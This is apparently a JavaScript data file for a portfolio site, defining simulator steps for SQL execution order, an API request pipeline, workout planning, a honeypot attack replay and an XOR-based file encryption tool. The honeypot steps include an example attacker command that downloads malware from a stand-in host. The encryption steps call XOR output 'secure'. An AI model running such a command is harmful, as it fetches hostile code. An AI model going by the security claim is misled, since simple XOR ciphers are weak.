// Simulation Engine for Portfolio Projects
// Centralizes the step data, flow definitions, and helper states

export const SIMULATION_DATA = {
  sqlsense: {
    title: "Query Flow Simulator",
    description: "Visually trace the step-by-step logical execution order of a SQL SELECT statement.",
    steps: [
      {
        id: "from",
        label: "FROM",
        order: 1,
        explanation: "Identify the primary source table and load its raw records into memory.",
        inputConcept: "Database physical storage files.",
        outputConcept: "Raw row set with all columns from the primary table.",
        exists: true
      },
      {
        id: "join",
        label: "JOIN",
        order: 2,
        explanation: "Merge primary table records with target table records based on ON key matches.",
        inputConcept: "Raw row set + joined table records.",
        outputConcept: "Merged virtual table with columns from both relations.",
        exists: true
      },
      {
        id: "where",
        label: "WHERE",
        order: 3,
        explanation: "Filter rows, keeping only records that satisfy the filter condition expressions.",
        inputConcept: "Merged virtual table records.",
        outputConcept: "Subset of rows passing query filter criteria.",
        exists: true
      },
      {
        id: "groupby",
        label: "GROUP BY",
        order: 4,
        explanation: "Bucket the remaining rows by matching values of the grouping columns.",
        inputConcept: "Filtered row set.",
        outputConcept: "Grouped buckets ready for aggregate calculations.",
        exists: true
      },
      {
        id: "having",
        label: "HAVING",
        order: 5,
        explanation: "Filter aggregate group buckets, discarding groups that fail target conditions.",
        inputConcept: "Aggregated group buckets.",
        outputConcept: "Subset of group buckets meeting conditions.",
        exists: true
      },
      {
        id: "select",
        label: "SELECT",
        order: 6,
        explanation: "Project target columns, compute scalar expressions, and evaluate aggregate functions.",
        inputConcept: "Filtered group buckets or row collections.",
        outputConcept: "Projected output schema columns and computed metrics.",
        exists: true
      },
      {
        id: "orderby",
        label: "ORDER BY",
        order: 7,
        explanation: "Sort the projected output records based on order expressions and directions.",
        inputConcept: "Unsorted projected results.",
        outputConcept: "Sorted sequence of output rows.",
        exists: true
      },
      {
        id: "limit",
        label: "LIMIT",
        order: 8,
        explanation: "Truncate results to return only the first N records.",
        inputConcept: "Sorted rows dataset.",
        outputConcept: "Truncated result set containing at most N rows.",
        exists: true
      }
    ]
  },
  "api-automation-generator": {
    title: "API Request Lifecycle Simulator",
    description: "Visualize how a client request travels through a compiled middleware architecture.",
    steps: [
      {
        id: "client-req",
        label: "Client Request",
        order: 1,
        explanation: "Client initiates HTTP/S request containing route parameters, headers, and request body.",
        inputConcept: "User interaction on browser / client app.",
        outputConcept: "Raw TCP socket packet stream parsed as HTTP request object.",
        exists: true
      },
      {
        id: "auth",
        label: "Authentication",
        order: 2,
        explanation: "Verify client identity credentials or token signatures (e.g. JWT) in request headers.",
        inputConcept: "HTTP request headers (Authorization Bearer).",
        outputConcept: "Verified User Principal object / Token payload.",
        exists: true
      },
      {
        id: "authz",
        label: "Authorization",
        order: 3,
        explanation: "Validate user privileges and roles against resource policies (RBAC/ABAC checks).",
        inputConcept: "User Principal object and route permission flags.",
        outputConcept: "Granted execution token for requested controller endpoint.",
        exists: true
      },
      {
        id: "validation",
        label: "Validation",
        order: 4,
        explanation: "Parse payload structures and validate field types against Zod/JSON schemas.",
        inputConcept: "Raw JSON request body payload.",
        outputConcept: "Strictly typed, validated data transfer object (DTO).",
        exists: true
      },
      {
        id: "middleware",
        label: "Middleware Chain",
        order: 5,
        explanation: "Run custom global or route-specific middleware functions (e.g. logging, tracing headers).",
        inputConcept: "Validated DTO and context trackers.",
        outputConcept: "Enriched request context object.",
        exists: true
      },
      {
        id: "rate-limiter",
        label: "Rate Limiter",
        order: 6,
        explanation: "Assess request frequencies against limits using Token Bucket algorithms to block DDoS attempts.",
        inputConcept: "Client IP address / User ID.",
        outputConcept: "Allowed execution path (within usage limit) or 429 Too Many Requests response.",
        exists: true
      },
      {
        id: "controller",
        label: "Controller Handler",
        order: 7,
        explanation: "Execute core business operations, invoking services, models, and helper routines.",
        inputConcept: "Enriched request DTO parameters.",
        outputConcept: "Raw output data models or execution statuses.",
        exists: true
      },
      {
        id: "database",
        label: "Database Layer",
        order: 8,
        explanation: "Query or mutate persistent tables in PostgreSQL or document stores.",
        inputConcept: "Structured query commands / ORM commands.",
        outputConcept: "Persisted records / Transaction confirmations.",
        exists: true
      },
      {
        id: "response",
        label: "HTTP Response",
        order: 9,
        explanation: "Construct response body payload, attach status codes, and return back to the client socket.",
        inputConcept: "Raw output model response payload.",
        outputConcept: "Structured HTTP/S Response payload packet.",
        exists: true
      }
    ]
  },
  "workout-planning-app": {
    title: "Workout Intelligence Simulator",
    description: "Inspect the heuristic planning pipeline that generates customized workout routines.",
    steps: [
      {
        id: "goal",
        label: "User Goal",
        order: 1,
        explanation: "Capture target objective (e.g. Muscle Gain, Strength, Endurance) to select workload templates.",
        inputConcept: "User selection profile data.",
        outputConcept: "Core fitness routine target profile.",
        exists: true
      },
      {
        id: "fitness-lvl",
        label: "Fitness Level",
        order: 2,
        explanation: "Analyze training tenure and age to calibrate starting baseline volume.",
        inputConcept: "User experience parameters (Tenure, Age).",
        outputConcept: "Baseline sets, rep ranges, and initial load intensity parameters.",
        exists: true
      },
      {
        id: "equipment",
        label: "Equipment Check",
        order: 3,
        explanation: "Filter database exercise options based on available gear (e.g. gym, barbell, bodyweight).",
        inputConcept: "Equipment options lists.",
        outputConcept: "Filtered exercise library options subset.",
        exists: true
      },
      {
        id: "exercises",
        label: "Exercise Selection",
        order: 4,
        explanation: "Choose targeted compound movements and isolation exercises to fulfill selected goals.",
        inputConcept: "Filtered exercise library subset.",
        outputConcept: "Selected workout movements map.",
        exists: true
      },
      {
        id: "volume",
        label: "Volume Math",
        order: 5,
        explanation: "Calculate optimal working sets, reps, and rest interval metrics for selected movements.",
        inputConcept: "Baseline parameters and selected movements map.",
        outputConcept: "Calculated set and rep workload matrix.",
        exists: true
      },
      {
        id: "recovery",
        label: "Recovery Analysis",
        order: 6,
        explanation: "Evaluate sleep and soreness levels to compute rest days and training frequency adjustments.",
        inputConcept: "Soreness metrics and sleep hours input.",
        outputConcept: "Adaptive volume modifiers (schedules shifts).",
        exists: true
      },
      {
        id: "weekly-plan",
        label: "Plan Generation",
        order: 7,
        explanation: "Assemble exercise details and schedules into a weekly calendar routine view.",
        inputConcept: "Workload matrix and recovery modifiers.",
        outputConcept: "Finalized 7-day adaptive workout calendar plan.",
        exists: true
      }
    ]
  },
  "honeypot-system": {
    title: "Cyber Attack Replay Simulator",
    description: "Replay simulated attack sequences to see how logs and alarms are captured in real-time.",
    steps: [
      {
        id: "connection",
        label: "Attacker Connection",
        order: 1,
        explanation: "Intruder opens connection attempts on exposed simulated ports (e.g., SSH port 22 or HTTP port 80).",
        inputConcept: "Raw TCP socket handshake connection request.",
        outputConcept: "Established shell decoy session connection.",
        exists: true
      },
      {
        id: "interaction",
        label: "Honeypot Decoy",
        order: 2,
        explanation: "Simulated listener accepts decoy authentication parameters, tricking attacker into interacting.",
        inputConcept: "Username and password login credentials inputs.",
        outputConcept: "Interactive decoy terminal prompt.",
        exists: true
      },
      {
        id: "execution",
        label: "Command Attempt",
        order: 3,
        explanation: "Adversary attempts to run commands (e.g., searching config directories or downloading malwares).",
        inputConcept: "Raw command inputs (e.g. wget http://malicious-ip/malware).",
        outputConcept: "Simulated command response, blocking execution while recording payload details.",
        exists: true
      },
      {
        id: "logging",
        label: "Telemetry Log",
        order: 4,
        explanation: "Daemon capture engine records session inputs, IPs, commands, and hashes to local logs.",
        inputConcept: "Decoy session activity trackers.",
        outputConcept: "Structured JSON telemetry log records.",
        exists: true
      },
      {
        id: "scoring",
        label: "Threat Scoring",
        order: 5,
        explanation: "Heuristic classification systems evaluate logs to assess adversary risk level.",
        inputConcept: "Structured JSON telemetry log records.",
        outputConcept: "Threat rating metrics (CRITICAL, HIGH, MEDIUM, LOW) and signature match labels.",
        exists: true
      },
      {
        id: "alert",
        label: "Alert Trigger",
        order: 6,
        explanation: "System generates emergency alerts and dispatches payloads to webhook slack/discord channels.",
        inputConcept: "Threat rating metrics above critical thresholds.",
        outputConcept: "Slack / Discord alert notifications dispatch confirmation.",
        exists: true
      }
    ]
  },
  "file-encryption-tool": {
    title: "C++ Cryptographic File Engine Simulator",
    description: "Trace binary file streams being encrypted and decrypted through C++ RAII memory buffers with symmetric key verification.",
    steps: [
      {
        id: "source",
        label: "Original Data",
        order: 1,
        explanation: "C++ file stream (std::ifstream) loads file bytes into volatile chunk buffers (e.g., 16KB window blocks).",
        inputConcept: "Plaintext file stream / binary byte arrays.",
        outputConcept: "std::vector<uint8_t> buffer streams in memory.",
        exists: true
      },
      {
        id: "key-gen",
        label: "Key Matrix",
        order: 2,
        explanation: "Derive key schedules and pseudo-random byte expansion matrices from secret passphrase using C++ algorithms.",
        inputConcept: "User secret passphrase key string.",
        outputConcept: "Expanded C++ pseudo-random key matrix.",
        exists: true
      },
      {
        id: "cipher",
        label: "Encryption",
        order: 3,
        explanation: "Execute bitwise XOR transformation between raw input buffers and generated C++ key streams.",
        inputConcept: "Plaintext byte buffer + C++ key matrix.",
        outputConcept: "Encrypted ciphertext byte buffer.",
        exists: true
      },
      {
        id: "output",
        label: "Ciphertext File",
        order: 4,
        explanation: "C++ std::ofstream writes ciphertext buffer blocks to target file and prepends SHA-256 integrity hash metadata.",
        inputConcept: "Encrypted ciphertext byte buffer.",
        outputConcept: "Secure .enc ciphertext file with header hash.",
        exists: true
      },
      {
        id: "decipher",
        label: "Decryption",
        order: 5,
        explanation: "Re-apply symmetric C++ stream key operations across ciphertext byte streams using matching secret key.",
        inputConcept: ".enc ciphertext file + matching passphrase key.",
        outputConcept: "Decrypted byte streams in memory buffer.",
        exists: true
      },
      {
        id: "restore",
        label: "Plaintext Restored",
        order: 6,
        explanation: "Validate checksum header hash against restored buffer to verify integrity and output restored original file.",
        inputConcept: "Decrypted byte stream + SHA-256 checksum.",
        outputConcept: "Restored original binary/text file.",
        exists: true
      }
    ]
  }
};

export function getSimulation(projectId) {
  return SIMULATION_DATA[projectId] || null;
}
